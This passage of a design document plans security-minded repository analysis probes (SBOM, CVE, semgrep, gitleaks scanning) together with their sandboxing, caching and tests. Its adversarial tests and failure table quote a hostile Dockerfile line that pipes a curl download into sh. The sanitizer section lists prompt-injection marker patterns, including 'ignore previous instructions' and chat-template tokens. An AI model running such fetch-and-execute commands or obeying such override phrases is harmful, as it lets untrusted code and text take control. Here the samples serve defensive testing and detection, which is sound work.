  - **Two-stage:** (a) Static parse of workspace manifests via `ParsedManifestMemo` (cheap; always runs; produces a "declared" edge set). (b) If `pnpm`/`yarn`/`npm` is available *and* the repo is a monorepo, invoke `pnpm list -r --depth -1 --json --ignore-scripts` (or `yarn workspaces list --json --no-default-rc` or `npm ls --json --workspaces` depending on which lockfile exists) inside the sandbox to capture the *resolved* graph including hoisted deps and workspace overrides.
  - **`--ignore-scripts` is mandatory** (closes the postinstall-RCE path the critic flagged in §B-3). The wrapper enforces this; CI test asserts that invoking the wrapper without `--ignore-scripts` raises a typed exception.
  - **Output records both** the declared graph and the resolved graph, plus a `resolution_status: {static_only | resolved | resolved_with_discrepancy}` field. When the package manager isn't installed, the probe falls back to static-only and reports `confidence: medium` with a structured warning.
  - **The fabricated-graph problem [S] feared** (emitting a partial graph as `confidence: medium` evidence) is addressed by **distinguishing declared vs resolved in the output schema**: a consumer reading `resolution_status: static_only` knows the resolved graph is absent. That's evidence, not judgment. `[synth]`
- **Why this choice over alternatives:** [S]'s package-manager-ban emits a fabricated graph (critic §S.1 — "judgment dressed as evidence"). [P]'s `networkx` from manifests alone misses hoisted/peer-dep resolution. [B]'s `pnpm list` without `--ignore-scripts` runs postinstall (critic §B-2). The synthesis enables resolution-aware monorepo evidence while closing the RCE path. Conflict-resolution row D7.
- **Tradeoffs accepted:**
  - `--ignore-scripts` means peer-dep resolution that depends on postinstall-generated bindings is incomplete. Honest. `confidence: medium` on those cases.
  - Cost: ~2-5 s of `pnpm list` per gather on a 100-package monorepo. Cached on `pnpm-lock.yaml + workspace manifest hash`. `[synth]`

### 4. Layer C probes — static + image-time in Phase 2; runtime trace (C4) deferred

- **Provenance:** `[synth — departs from all three lenses]`
- **Scope decision:** Phase 2 ships **C1 (Dockerfile), C2 (SBOM), C3 (CVE), C5 (ShellUsage), C6 (Certificate), C7 (Entrypoint)**. **C4 (RuntimeTrace) ships the probe *class* with `applies()` returning `False` and a clear `runtime_trace_pending: true` slice marker**, and is fully implemented in Phase 5 alongside the sandbox stack ADR-0019 resolves.
- **Why this scope:** All three lenses fail Phase 2's exit criterion in different ways. The synthesis splits the deferral surgically: the probes Phase 3 (vuln remediation) hard-depends on are `SBOM` + `CVE` — those ship. Runtime-trace evidence is for Phase 7 (distroless), and Phase 7 is after Phase 5, so the deferral order matches the dependency graph. **The C4 probe class exists; the sub-schema exists; consumers can read `runtime_trace_pending: true` as a first-class signal.** Conflict-resolution row D8.

#### 4.1 `DockerfileProbe` (C1)

- **Provenance:** `[B + S]`
- **Purpose:** Static parse of Dockerfile structure. Per `localv2.md §5.3 C1`.
- **Interface:** Probe ABC. `declared_inputs = ["Dockerfile", "Dockerfile.*", ".dockerignore"]`. `requires = []`. `applies_to_languages = ["*"]`. `timeout_seconds = 15`.
- **Internal design:** Uses the `dockerfile` Python library (pure-Python parser, well-fuzzed). Emits parsed instructions, multi-stage detection, `RUN` command shape, exposed ports, entrypoint form. **No `buildctl debug dump-llb` fallback** (would require BuildKit running and expand attack surface for marginal gain on a small minority of complex Dockerfiles). The probe records `confidence: medium` when the parser can't fully resolve a `RUN` directive (e.g., complex variable interpolation). `[S]`

#### 4.2 `SyftSBOMProbe` (C2)

- **Provenance:** `[P + S + synth]`
- **Purpose:** Generate the SBOM for the current container image. Per `localv2.md §5.3 C2`.
- **Interface:** Probe ABC. `declared_inputs = ["Dockerfile", "Dockerfile.*", ".dockerignore", "package.json", "pnpm-lock.yaml", "yarn.lock", "package-lock.json"]`. `requires = ["dockerfile"]`. `applies_to_languages = ["*"]`. `timeout_seconds = 300`. `sandbox: network="scoped"` (allowlist: the configured base-image registry host).
- **Internal design:**
  - Cache key: `(dockerfile_hash, dockerignore_hash, lockfile_hash, base_image_digest_at_registry, syft_digest, probe_version, schema_version)`. Base-image digest resolved via a single `docker manifest inspect` call (~200 ms; LRU-cached for 1 hour in the wrapper since base-image digests change rarely within a portfolio scan).
  - On cache miss: invokes `docker build --quiet -t codegenie/<repo_hash>:<gather_id> .` inside the sandbox; then `syft <image-digest> -o json`. The build's `RUN` lines that need public-internet egress (`RUN curl http://...`) will *fail* inside the sandbox (default `network="none"` for the build phase; only the initial base-image pull uses `"scoped"`). The probe records `build_status: failed, network_egress_attempted: true` and `confidence: low`. **This is honest evidence** — exactly the kind of supply-chain risk the Planner should know about. `[S — without the local registry mirror]`
  - On cache hit: skip both build and scan; reuse cached SBOM JSON.
- **Why this choice over alternatives:** [B] defers SBOM to Phase 5 (critic's strongest attack — direct roadmap-scope violation). [S] adds a local registry mirror as a long-lived service (critic §S.4 — violates "single Python project, no services"). [P] ships SBOM behind a deterministic build-config hash to skip rebuilds (kept). Conflict-resolution row D9.
- **Tradeoffs accepted:**
  - Builds that depend on public-internet `RUN curl` fail in our sandbox — correct evidence, not a bug. `[S]`
  - Base-image pulls hit the configured registry (potentially `docker.io`); supply chain not isolated beyond Phase 0's sandbox. **Phase 14's production worker adopts a local registry mirror; Phase 2 doesn't.** `[synth]`

#### 4.3 `GrypeCVEProbe` (C3)

- **Provenance:** `[P + S]`
- **Purpose:** CVE scan against the SBOM. Per `localv2.md §5.3 C3`.
- **Interface:** Probe ABC. `requires = ["syft_sbom"]`. `declared_inputs = []` (consumes the SBOM output). `timeout_seconds = 120`. `sandbox: network="scoped"` (allowlist: the grype vuln-DB host, on cache miss only).
- **Internal design:** Invokes `grype sbom:<path-to-sbom-json> -o json --quiet`. **Vuln DB management:** `grype db check` runs at sandbox start; if the DB is older than 24 hours, `grype db update` runs (one-shot scoped network egress). DB integrity verified against a checked-in `tools/grype-db-listing.signed.json` pin. **Trivy cross-check is opt-in only** (`--paranoid` flag); default workload runs grype-only.
- **Cache key:** `(sbom_content_hash, grype_db_version, grype_digest, probe_version, schema_version)`. `[P]`

#### 4.4 `RuntimeTraceProbe` (C4) — class only; `applies()` returns False

- **Provenance:** `[synth]`
- **Purpose:** Ship the probe class so the registry knows it exists; ship the sub-schema so consumers can read the slice shape; mark `applies() = False` so it never runs in Phase 2.
- **Interface:** Probe ABC. `applies()` always returns `False` in Phase 2. The sub-schema declares `runtime_trace: {status: "deferred_to_phase_5", reason: "C4 requires sandbox stack ADR-0019 resolution"}`. B2's `runtime_trace` domain reads `status: "not_applicable"` (not `not_run`), which the critic flagged as the structural fix for "not_run drowning the real signal." `[synth — addresses critic cross-design shared blind spot #2]`
- **Why this choice over alternatives:** [P] ships C4 gated by `applies_to_tasks` that don't exist (critic §P.4 — dead code). [S] ships C4 with rootless Podman + `CAP_SYS_PTRACE` + in-sandbox stub services (Phase 5 work disguised as Phase 2). [B] defers entirely (no class, no schema — Phase 3 consumers have nothing to bind against). The synthesis ships the contract surface; Phase 5 lands the implementation. Conflict-resolution row D10.

#### 4.5 `ShellUsageProbe` (C5), `CertificateProbe` (C6), `EntrypointProbe` (C7)

- **Provenance:** `[B + S]`
- **Purpose:** Per `localv2.md §5.3 C5/C6/C7`. Synthesize evidence from C1 + the `shell_replacements/node.yaml` catalog + `package.json`'s `engines` + Helm values; emit slices for each.
- **Interface:** All three are standard probes; `sandbox: network="none"`. They consume `dockerfile` probe output and the catalogs. They explicitly do **not** consume C4 output (since C4 is deferred); they declare `runtime_trace_pending: true` in their own slices where the static evidence is incomplete without runtime confirmation.

### 5. Layer D — Organizational

#### 5.1 Skills loader — `src/codegenie/skills/`

- **Provenance:** `[B + synth on path resolution + S on poisoned-skill defense]`
- **Purpose:** Discover, validate, and index Skills from the configured roots. Index by `applies_to.task_types` × `applies_to.languages` × `applies_to.conditions`.
- **Interface:** `discover_skills(roots: Sequence[Path]) -> SkillIndex`. **Roots are passed explicitly**; no implicit `~/` resolution in the loader itself. The CLI layer is the only place that resolves `~/.codegenie/skills/` and similar — the loader sees absolute paths. `[synth — addresses critic §B-4]`
- **Internal design:**
  - YAML frontmatter via Phase 1's `safe_yaml.load` (caps inherited). Frontmatter validated against `src/codegenie/skills/schema/skill.schema.json` (Draft 2020-12). Malformed → loud failure at CLI startup.
  - **Body is never loaded into memory.** Only `body_char_count` from `stat()`. Progressive disclosure (ADR-0007). `[B]`
  - **`required_tools` field is cross-referenced against `tools/digests.yaml`.** A skill that declares a tool the project hasn't pinned is recorded with `applicability: degraded`. Catches a poisoned skill that adds a `required_tools: [malicious-tool]` claim. `[S]`
  - **Symlinks are not followed** (Phase 1 `O_NOFOLLOW` precedent). `[S + B-resolved-toward-no]`
- **Where it lives:** `src/codegenie/skills/{loader.py,models.py,schema/skill.schema.json}`.

#### 5.2 `SkillsIndexProbe` (D2)

- **Provenance:** `[B + synth on declared_inputs]`
- **Interface:** Probe ABC. `declared_inputs` is the **resolved** path list passed by the CLI, not `~/.codegenie/skills/**/SKILL.md` as a glob token. **Resolution happens in `cli.py`**; the probe's `declared_inputs` is a list of resolved absolute paths under the user's home + the repo-local `.codegenie/skills/` + the optional org-shared path. Cache invalidation tracks the resolved content. `[synth — addresses critic §B-4]`
- **Tradeoffs:** Cache key depends on which Skills are physically on disk at gather time. Tests run with isolated roots (no implicit `$HOME` fallback). `[B]`

#### 5.3 `ConventionProbe` (D5) — and the conventions catalog

- **Provenance:** `[B + synth on enum policy]`
- **Internal design:** Conventions at `src/codegenie/catalogs/conventions/<language>.yaml`. Schema `_schema.json`. Same package as Phase 1's `native_modules.yaml`. `detect.type` is a **closed enum**; new types require a code change in `_apply_detector(...)` *and* a schema bump *in the same PR*. CI gate (a small lint) fails when `match/case` in `_apply_detector` grows a new branch without a corresponding `_schema.json` update. `[synth — addresses critic §B-2 cross-design observation #3 "catalogs as data — but enforced only by convention"]`
- **Where it lives:** `src/codegenie/probes/convention.py`.

#### 5.4 `ExternalDocsProbe` (D8) + `ExternalDocsIndexProbe` (D9) — filesystem-only in Phase 2

- **Provenance:** `[synth — narrows [B] and [S]]`
- **Scope decision:** Phase 2 supports **filesystem-only sources** (a config-declared list of local paths under `.codegenie/notes/` and a configured external-docs root). **URL fetching, Confluence, and Notion integrations are deferred** to a Phase-2 ADR-gated future addition (likely v0.2 per `localv2.md §12 Week 5`). The SSRF guard from [S] is the *gating prerequisite* for any future URL-fetcher, documented in the ADR but not implemented in Phase 2.
- **Why:** [S]'s SSRF guard + scoped fetch sandbox + Confluence credentials + private-IP-deny-list is significant security infrastructure for a feature `localv2.md` explicitly schedules as Phase-2 Week 5 stretch. Filesystem-only sources let Phase 2 exercise the D9 BM25 indexer and the prompt-injection marker tagger without the SSRF surface. `[synth]`
- **Internal design:**
  - `ExternalDocsProbe`: iterates configured filesystem paths; copies markdown into `.codegenie/context/raw/external-docs/` at `0600`; **scans each body with the prompt-injection marker tagger (Pass 5)** and records `prompt_injection_marker_count` per document; body is **never inlined** into `repo-context.yaml`. `[S]`
  - `ExternalDocsIndexProbe`: builds BM25 index. **Default engine: ripgrep-based** (fast enough for the POC; ~50 ms per query at Stage 3 time). **`tantivy` is opt-in via `pip install codegenie[search]`** and gated by a Phase-2 ADR. Default CI path exercises ripgrep, not tantivy. The critic's "tantivy as dead-code-by-default" attack (§B-5) is honored: tantivy is not a default dependency. `[synth]`
- **Where they live:** `src/codegenie/probes/external_docs.py`, `external_docs_index.py`.

#### 5.5 `RepoConfigProbe` (D1), `ADRProbe` (D3), `PolicyProbe` (D4), `ExceptionProbe` (D6), `RepoNotesProbe` (D7)

- **Provenance:** `[B + S sanitizer pass 5 on D7]`
- **Internal design:** All <80 LOC. Each reads a known path (or globs); validates against a small Pydantic model; emits a structural slice.
  - **`RepoNotesProbe` bodies are stored under `.codegenie/context/raw/notes/` at `0600`; never inlined into `repo-context.yaml`; scanned by Pass 5 for prompt-injection markers; recorded with `prompt_injection_marker_count`.** `[S]`
  - **`ExceptionProbe`** date-parses `expires`; emits structured entries.
  - **`ADRProbe`** walks `docs/adr/` and friends; ADR ID + status + title only.

### 6. Layer E — `OwnershipProbe` (E1) real; E2-E5 stubs

- **Provenance:** `[B]`
- **Internal design:** `OwnershipProbe` reads `CODEOWNERS` (GitHub-documented format); pure Python parser. `ServiceTopologyProbe`, `ServiceContractProbe`, `SLOProbe`, `ProductionConfigProbe` are stubs whose `applies()` returns `False` unless config provides a source; one unit test per stub asserts the stub shape. `[B]`

### 7. Layer G — SAST + behavioral hints

#### 7.1 `SemgrepProbe` (G1)

- **Provenance:** `[P per-file cache + S sandbox + B rule-pack catalog]`
- **Purpose:** Run `semgrep` with curated rule packs. Per `localv2.md §5.6 G1`.
- **Interface:** Probe ABC. `requires = ["language_detection"]`. `declared_inputs = ["src/**/*.{ts,tsx,...}", "Dockerfile", "Dockerfile.*", ".codegenie/semgrep-rules/**/*.yaml"]`. `applies_to_languages = ["*"]`. `timeout_seconds = 360`. `sandbox: network="none"`.
- **Internal design:**
  - **Rule packs pinned by digest in `tools/digests.yaml`** (`p/dockerfile`, `p/nodejs`, `p/javascript`, `p/secrets`, `p/owasp-top-ten`, `p/cwe-top-25`). Pre-warmed at install time into a sandbox-readable cache directory; semgrep is invoked with `SEMGREP_RULES_CACHE=<pinned-dir> --disable-version-check --disable-metrics`. Network is `none`. `[S]`
  - **Per-file findings cache** (P). Keyed on `(file_content_blake3, rule_pack_version_hash, semgrep_digest)`. Stored under `.codegenie/cache/semgrep/by-file/`. On incremental gather, semgrep runs over changed files only; unchanged-file findings come from the sub-cache. `[P]`
  - **Cross-file taint mode** (`--config p/taint-mode`) is opt-in via `--paranoid`; it bypasses the per-file cache and falls back to whole-corpus runs. `[P]`
  - **Custom rules** under `.codegenie/semgrep-rules/` (repo-local) and `<configured-org-root>/semgrep-rules/` (org-shared, resolved at CLI not in `declared_inputs` globs). Their content hashes participate in the cache key. `[B]`
  - Rule pack catalog: `src/codegenie/catalogs/semgrep_rule_packs.yaml` — declares which packs apply per task. Closed enum on `task_types`. `[B]`
- **Tradeoffs accepted:** `semgrep`'s startup is ~1.2 s (rule-pack load); the DaemonPool from [P] would amortize this but is rejected. Cost: ~3-5 s per cold gather. `[synth — accepted cost]`

#### 7.2 `GitleaksProbe` (G6 — new, not in `localv2.md` Layer G)

- **Provenance:** `[S + P PR-mode + B redaction-discipline]`
- **Purpose:** Secret scanning. Phase 2 roadmap explicitly names `gitleaks` as a tool.
- **Interface:** Probe ABC. `applies_to_languages = ["*"]`. `applies_to_tasks = ["*"]`. `requires = []`. `declared_inputs = ["**/*"]` filtered by Phase 1's exclusion set. `timeout_seconds = 60`. `sandbox: network="none"`.
- **Internal design:**
  - **Two invocation modes:**
    - Default (`gitleaks detect --no-banner --redact --no-git -f json -s <path>`).
    - PR-trigger mode (when called from Phase 14's PR webhook): `gitleaks detect --no-banner --redact --no-git -f json --baseline-path <baseline> -s <path>`. `[P]`
  - **`--redact` is mandatory.** The wrapper enforces it; CI test asserts. `[S]`
  - **OutputSanitizer Pass 4** belt-and-suspenders rewrites any field matching `match|secret|finding|raw|context` to `{content_hash: BLAKE3(value), entropy_band: low|med|high, length: int}`. `[S]`
  - **Findings carry `file`, `line_start`, `line_end`, `rule_id`, `commit`, `entropy_band`, `content_hash`**. The matched secret bytes never reach the cache, audit, or `repo-context.yaml`. `[S]`
  - History scan (across git log) is opt-in (default off). `[S]`
- **Where it lives:** `src/codegenie/probes/gitleaks.py`.

#### 7.3 `AstGrepProbe` (G2), `TestCoverageMappingProbe` (G3), `InvariantHintProbe` (G4), `GrepProbe` (G5)

- **Provenance:** `[B]`
- **Internal design:** Same shape — thin wrapper → Pydantic result → slice. Each <100 LOC. Each with a golden + a unit test + an adversarial fixture. **`TestCoverageMappingProbe` consumes the SCIP index file directly** via `protobuf` parsing (no daemon re-call). `[P]`

### 8. Cache layer extension

- **Provenance:** `[P + S — both agreed; integrated]`
- **Internal design:**
  - Cache-key derivation extends with tool digests from `tools/digests.yaml`. A `semgrep` upgrade invalidates every `SemgrepProbe` cache entry. `[S]`
  - Per-file findings sub-caches: `.codegenie/cache/{semgrep,gitleaks,tree-sitter}/by-file/`. Keyed on file content BLAKE3 + tool/rule/grammar version. Independent layer from the per-probe `ProbeOutput` cache. `[P]`
  - Per-blob BLAKE3 integrity check on read. `[S]`
  - `cache gc` extended to manage `.codegenie/cache/<probe>/by-file/` (LRU by access time) and `.codegenie/index/scip-index.scip` (per-repo, never auto-deleted; manual `cache prune-index`).
  - **No mmap.** Phase 0/1 deferred. `[synth]`

### 9. OutputSanitizer — Pass 4 + Pass 5

- **Provenance:** `[S]`
- **Internal design:**
  - **Pass 4 (secret-finding fingerprinter):** any field matching `match|secret|finding|raw|context|value` regex is rewritten to `{content_hash: BLAKE3(value), entropy_band, length}`. Runs in the coordinator before the cache, audit, or YAML write.
  - **Pass 5 (prompt-injection marker tagger):** scans long strings (>256 chars) for marker patterns (`<\|im_start\|>`, `[INST]`, `<<SYS>>`, `ignore previous instructions`, etc.); emits `prompt_injection_marker_count` metadata; preserves the string verbatim (so Phase 3's context assembler can route via tool-output, not inline).
  - **Schema-level enforcement** as belt-and-suspenders: any object tagged `x-secret-finding: true` in its sub-schema is required to have `content_hash`, `entropy_band`, `length` and forbidden from having `match|raw|value|secret|context`. `[S]`

### 10. AuditWriter — rolling BLAKE3 chain head

- **Provenance:** `[S]`
- **Internal design:** Phase 0's audit JSON is enriched with a rolling BLAKE3 chain head per gather. The chain head is written to `runs/<utc>.json#previous_hash`; on next gather start, the prior chain head is verified. A chain break emits `audit.chain_break_detected` (observability only — does not fail the gather). Phase 14's transparency log replaces this. `[S]`

### 11. Schema additions

Per-probe sub-schemas under `src/codegenie/schema/probes/`, one per Phase 2 probe (~17 files), each `additionalProperties: false` at its own root. Envelope's `probes.*` keeps `additionalProperties: true`. Cross-probe dependency: `if cve_scan.* present then index_health.cve.confidence MUST be present` (Draft 2020-12 `if/then`). `[B + S]`

### 12. Coordinator — peer-output binding (one branch, ADR-gated)

- **Provenance:** `[synth]`
- **Internal design:** Phase 0's `Coordinator.dispatch(probe)` is extended with one branch: if `probe.consumes_peer_outputs is True`, the coordinator passes a **frozen immutable snapshot** of all peer probes' `ProbeOutput` dicts (already sanitized through passes 1-5) to `probe.run(ctx, snapshot, peer_outputs)` as a third positional argument. Probes that don't declare the attribute see the standard two-arg signature (Python's `inspect.signature` is used once at registration time; the dispatch chooses the right call shape).
- **Why this choice over alternatives:** [B]'s `ProbeContext.peer_outputs: Mapping` mutates the Phase-0 dataclass shape (critic §B-3). The opt-in attribute + dispatch-time signature inspection means `ProbeContext` is unchanged for 99% of probes; only `IndexHealthProbe` sees the new shape. ADR-gated as `docs/phases/02-context-gather-layers-b-g/ADRs/0001-peer-outputs-binding.md`. `[synth]`

### 13. Catalog version policy + closed-enum CI gate

- **Provenance:** `[B + synth]`
- **Internal design:** Every Phase-2 catalog declares `catalog_version: int`. Adding entries is a minor bump (cache invalidates for that probe). Removing or restructuring entries is a major bump (probe + sub-schema both change in the same PR). **A CI lint asserts: every `match/case` branch in any `_apply_detector` function has a corresponding `_schema.json` enum value**, and vice versa. Phase 7's distroless `detect.type` additions will pass this lint or fail loud. `[synth — closes the critic's "convention degrades over time" attack]`

---

## Data flow

Representative warm-path run on a Phase 1 Node TS fixture extended with `.codegenie/skills/`, semgrep rule packs, a SKILL.md, and one TS source file changed since last gather:

1. **CLI entry** (Phase 0; tool-readiness check covers Phase 2's six external CLIs).
2. **Coordinator dispatch** (Phase 0/1 unchanged + peer-output binding branch for B2).
3. **Wave 1:** `LanguageDetectionProbe` (Phase 1).
4. **Wave 2 (parallel; cache-miss on the one changed TS file's downstream):**
   - Phase 1 Layer A probes: `node_build_system`, `node_manifest`, `ci`, `deployment`, `test_inventory` — all cache-hit.
   - Layer B Phase 2: `scip_index` cache-misses (TS source changed) → re-index full corpus (no DaemonPool, no incremental — ~25 s, this is the dominant cost on warm-with-source-change); `node_reflection` re-parses only the changed file via per-file cache; `generated_code` re-checks the changed file's header; `build_graph` cache-hits (`pnpm-lock.yaml` unchanged).
   - Layer D Phase 2: `repo_config`, `skills_index`, `adr`, `convention`, `exception`, `policy`, `repo_notes`, `external_docs`, `external_docs_index` — all Tier-0 (pure-Python YAML/markdown reads), mostly cache-hit.
   - Layer E: `ownership` cache-hit.
5. **Wave 3 (after Wave 2 completes; requires dockerfile):**
   - Layer C Phase 2: `dockerfile` cache-hit; `syft_sbom` cache-hit (dockerfile + lockfile unchanged → build-config hash unchanged); `grype_cve` cache-hit; `shell_usage`, `certificate`, `entrypoint` cache-hit; `runtime_trace` `applies() = False` (Phase 2 deferred).
6. **Wave 4 (after Wave 2 completes; requires SCIP):**
   - Layer G: `semgrep` per-file findings cache hits for unchanged files; re-scans the one changed file (~3 s); `gitleaks` PR-mode with baseline (~40 ms); `test_coverage_map` consumes the new SCIP index; `ast_grep`, `invariant_hints`, `grep` cache-hit.
7. **Wave 5:** `index_health` runs last; the coordinator passes the frozen `peer_outputs` snapshot to its `run()`; B2 computes per-domain freshness (one `git rev-list --count` call, ~30 ms) and emits the `confidence_summary` slice; `runtime_trace` domain reports `status: not_applicable`.
8. **OutputSanitizer:** Pass 1 (field-name regex), Pass 2 (path scrubbing), Pass 3 (size/depth cap), Pass 4 (secret-finding fingerprinter — rewrites `gitleaks` findings), Pass 5 (prompt-injection marker tagger — scans `repo_notes` and `external_docs` bodies).
9. **Cache + envelope merge** (Phase 0/1).
10. **Schema validation** (Phase 1 mechanism extended with ~17 new sub-schemas + the cross-probe dependency rule).
11. **YAML write + audit record + rolling BLAKE3 chain head** (Phase 0/1 + Phase 2 chain-head extension).
12. **Exit 0** — or **exit 3** if `--strict` and any `index_health` domain is `low`.

**Total wall-clock for this scenario:** ~30 s p50 (dominated by SCIP re-index). Cold first-gather on a 1k-file repo: ~90 s p50.

---

## Failure modes & recovery

| Failure | Detected by | Containment | Recovery | Source |
|---|---|---|---|---|
| `scip-typescript` not on PATH | `tools.scip_typescript.run` raises `ToolNotFound` | n/a | `SCIPIndexProbe` emits `confidence: low`; gather continues | `[B]` |
| `scip-typescript` exits non-zero | Wrapper raises `ToolNonZeroExit` with stderr | Sandbox terminates | Probe emits `confidence: low`, `errors: [stderr]` | `[B+S]` |
| `scip-typescript` RCE inside sandbox via TS compiler exploit | Container has no network egress (audited); no host mounts via bwrap | Blast radius = sandbox process; egress bytes = 0 | Parent re-validates `.scip` against grammar before merging; `confidence: low` | `[S]` |
| Hostile Dockerfile `RUN curl ... | sh` | Build network=none ⇒ `curl` fails | Build inside sandbox fails | Probe records `build_status: failed, network_egress_attempted: true` | `[S]` |
| Stale SCIP index (committed `.scip` older than HEAD) | `IndexHealthProbe` compares `last_indexed_commit` to current commit | n/a | `index_health.scip.confidence: low, commits_behind: N`; **CI fixture asserts** | `[B + roadmap exit]` |
| Stale SBOM (Dockerfile changed since last SBOM run) | B2 compares `dockerfile_hash` to current | n/a | `index_health.sbom.confidence: low`; CI fixture asserts | `[synth — new fixture]` |
| Stale semgrep rule-pack | B2 compares rule-pack version to `tools/digests.yaml` pin | n/a | `index_health.semgrep.confidence: low`; CI fixture asserts | `[synth — new fixture]` |
| Skill manifest YAML malformed | Skills loader's JSON-schema validation fails at CLI startup | n/a | Hard fail with path; CLI exits 2 | `[B+S]` |
| Convention catalog malformed | Phase 1 catalog precedent | n/a | Hard fail at CLI startup | `[B]` |
| Adversarial markdown (zip-slip, huge file) in `RepoNotesProbe` body | Phase 1 path-traversal guards + Pass 5 marker tagger | Body never inlined; stored at `0600` | Skip file or `confidence: medium`; `prompt_injection_marker_count` recorded | `[S]` |
| `gitleaks` finds a secret | Wrapper redacts via `--redact`; Pass 4 belt-and-suspenders | Matched bytes never reach cache, audit, or YAML | Probe records rule_id + file + line + content_hash + entropy_band | `[S]` |
| `semgrep` rule pack from network (default semgrep behavior) | `SEMGREP_RULES_CACHE` env + `--network=none` | Tool sees pre-warmed cache only | Refuses to phone home; cache miss is fatal-loud | `[S]` |
| Custom semgrep rule with pathological regex (ReDoS) | Wrapper `timeout_s` enforced; sandbox cap | Process killed; sandbox restarts on next probe | Probe records `confidence: low`; rule flagged in audit | `[P+S]` |
| Tree-sitter grammar CVE | Pinned wheel hash in `uv.lock`; pip-audit/osv-scanner Phase 0 gate | Install gate blocks | Forced bump | `[S]` |
| `tantivy` not installed | `ExternalDocsIndexProbe` import-time fallback to ripgrep | n/a | BM25 via ripgrep; `confidence: medium` with structured warning | `[B+synth]` |
| `IndexHealthProbe` 200 ms budget breached | `asyncio` measurement (no hard kill) | n/a | `index_health.budget_exceeded: true`; observability metric fires; gather continues normally | `[synth — softer than [P]'s hard kill]` |
| `--strict` flag set and any B2 domain `low` | CLI exit-code mapping | n/a | Exit 3; envelope still written; intended for CI gating | `[B]` |
| `B5 BuildGraphProbe` package-manager invocation triggers postinstall | Wrapper enforces `--ignore-scripts`; CI test asserts | n/a | If `--ignore-scripts` somehow missing, fail loud at wrapper level | `[synth]` |
| `B2` upstream dependency probe failed for non-explicit reason | B2 records `status: failed_upstream` per domain | Gather **does not fail** (departure from [S]'s circuit-breaker) | Use `--strict` if CI wants to fail-loud | `[synth — addresses critic §S.5]` |
| Audit chain head break | Next gather start verifies prior chain head | n/a | Emit `audit.chain_break_detected` (observability); gather continues | `[S]` |
| Concurrent gather cache poisoning | Per-probe blob directory + atomic-write + BLAKE3 integrity on read | Mismatching blob deleted | Probe re-runs | `[S]` |
| `docker build` requires public-internet `RUN` line | Sandbox build network=none | Build fails inside sandbox | `confidence: low` for SBOM; `network_egress_attempted: true` recorded | `[S]` |
| SCIP index file corruption (worker SIGKILL mid-write) | SCIP magic-number check on next load | n/a | Full re-index next gather; cache entry invalidated | `[P+S]` |

The pattern from Phase 1 holds: typed exceptions at the wrapper boundary, caught at the probe, surfaced as structured `confidence: low` + structured `errors`/`warnings`. B2 is the regression gate; `--strict` is the optional CI hammer.

---

## Resource & cost profile

- **Tokens per run:** 0. `[all]` Phase 0 `fence` CI job extended.
- **Wall-clock per gather (Linux dev or CI runner):**
  - **Cold first-gather on 1k-file Node TS fixture (no `node_modules` committed):** p50 ~90 s, p95 ~150 s. Dominated by SCIP indexing (~25 s), `docker build` + `syft` (~30 s), `semgrep` (~15 s), `grype db update` if stale (~5 s).
  - **Warm gather (all cache hits):** p50 ~1.5 s, p95 ~3 s.
  - **Incremental gather (one TS file changed):** p50 ~4 s, p95 ~8 s. SCIP full re-index dominates; per-file findings caches hit for everything else.
- **Memory per gather (peak RSS):** ~400 MB (SCIP indexer ~150 MB, semgrep ~100 MB, sandbox overhead ~50 MB, coordinator ~50 MB, other ~50 MB). `[synth — between [P]'s 250 MB worker-resident and [P]'s 600 MB cold peak; no daemon]`
- **CPU per gather:** Cold ~40 CPU-seconds; warm ~1 CPU-second; incremental ~5 CPU-seconds. `[synth]`
- **Storage per repo:**
  - `repo-context.yaml`: ~80 KB.
  - `.codegenie/context/raw/`: ~5 MB (SCIP binary + semgrep findings + SBOM dominate).
  - `.codegenie/cache/`: ~10 MB after warm-up; per-file sub-caches add ~1-5 MB.
  - `.codegenie/index/scip-index.scip`: ~5 MB per repo.
  - Audit `runs/`: ~200 KB per gather.
- **External-dep additions (pip):** `markdown-it-py` (pure Python, well-supported); `tree-sitter` Python binding + `tree-sitter-typescript` + `tree-sitter-javascript` (C extension is unavoidable; pinned by wheel hash + `tools/digests.yaml` grammar SHA cross-check). **`tantivy` is opt-in via `pip install codegenie[search]`, not a default dep.** No `networkx` (rejected — `BuildGraphProbe` uses `pnpm list`, not in-process graph construction). `[synth — narrower than [P] or [B]]`
- **External CLI additions to `ALLOWED_BINARIES`** (each ADR-gated): `scip-typescript`, `semgrep`, `syft`, `grype`, `gitleaks`, `docker`. `[B+S]`
- **External system tools required:** Phase 1's `node` + Phase 2's six CLIs + `bwrap` (Linux) or `sandbox-exec` (macOS, already system). `[localv2.md §6]`
- **CI walltime delta vs Phase 1:** +90 s p50, +150 s p95 on the cold path. Surfaced as dashboard metric; not a gate. `[B]`

---

## Test plan

The Phase 1 test pyramid extends. Adversarial fixtures stay CI-gating; benchmark tests gate cache + coordinator changes.

### Unit tests (`tests/unit/probes/` and `tests/unit/tools/`)

- **Per probe:** ≥ 6 tests — happy path, missing input, malformed input, partial input, confidence-degrade cases, schema conformance. `[B]`
- **Per CLI wrapper:** ≥ 4 tests — recorded fixture stdout happy path, non-zero exit, timeout, malformed JSON. Wrappers tested against `tests/fixtures/tool_outputs/`; CLI never invoked in unit tests. `[B]`
- **Skills loader:** discovery, frontmatter parsing, schema validation, indexing, condition matching, `required_tools` cross-check vs `tools/digests.yaml`. `[B+S]`
- **Conventions detector dispatch:** one test per `detect.type` enum value, plus malformed-YAML and **closed-enum-lint** tests (asserting a `match/case` branch without a schema enum entry fails CI). `[synth]`
- **Coordinator peer-output binding:** assert `IndexHealthProbe.run()` receives the frozen snapshot positional arg; assert probes without `consumes_peer_outputs` see the two-arg signature; assert `ProbeContext` is unchanged. `[synth]`

### Adversarial tests (`tests/adv/`) — CI-gating

Phase 1's corpus extends with:

- `test_truncated_scip_index.py` — truncated `.scip` file; probe `confidence: low`, no OOM. `[B]`
- `test_scip_compiler_plugin_attempt.py` — hostile `tsconfig.json` `extends:` chain; sandbox contains; no host file modified. `[S]`
- `test_malformed_semgrep_output.py` — invalid JSON stdout; `ToolOutputMalformed` raised. `[B]`
- `test_semgrep_redos.py` — custom rule with pathological regex; timeout fires; sandbox restarts; `confidence: low`. `[P+S]`
- `test_gitleaks_redaction_invariant.py` — planted secret in fixture; assert `AKIAFAKE0000000000` bytes appear **nowhere** in `.codegenie/`. `[B+S]`
- `test_hostile_dockerfile_curl.py` — `RUN curl http://1.1.1.1 | sh`; sandbox network=none; build fails; SBOM records `network_egress_attempted: true`. `[S]`
- `test_syft_zipbomb.py` — Dockerfile COPYs zip bomb; syft OOM-killed by cgroup; probe `confidence: low`. `[S]`
